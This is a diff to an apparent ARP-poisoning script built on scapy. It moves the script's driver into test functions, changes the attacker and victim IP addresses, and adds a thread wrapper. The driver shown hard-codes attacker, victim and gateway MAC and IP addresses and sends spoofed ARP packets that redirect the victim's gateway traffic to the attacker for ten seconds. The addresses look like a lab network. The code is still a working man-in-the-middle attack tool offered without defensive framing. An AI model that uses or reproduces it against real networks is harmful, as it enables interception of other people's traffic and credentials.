@@ -1,5 +1,6 @@
 from scapy.all import *
 import multiprocessing
+import threading
 import time
 
 class ArpPoisoner(multiprocessing.Process):
@@ -48,16 +49,18 @@ class ArpPoisoner(multiprocessing.Process):
 
         self.exit.set()
 
-
-if __name__ == "__main__":
+def test_cb():
     
     arp_poisoner = ArpPoisoner("enp0s10")
+
     mac_attacker = "08:00:27:52:b1:13"
     mac_victim = "08:00:27:69:ca:f1"
     mac_gateway = "52:54:00:12:35:00"
-    ip_attacker = "10.0.123.6"
-    ip_victim = "10.0.123.5"
+
+    ip_attacker = "10.0.123.5"
+    ip_victim = "10.0.123.4"
     ip_gateway = "10.0.123.1"
+
     # Create packet to send to victim
     arp_poisoner.add_packet(mac_attacker, mac_victim, ip_gateway, ip_victim)
 
@@ -68,3 +71,12 @@ if __name__ == "__main__":
     arp_poisoner.run()
     time.sleep(10)
     arp_poisoner.stop()
+
+def test():
+
+    thread = threading.Thread(target=test_cb)
+    thread.run()
+
+if __name__ == "__main__":
+
+    test()
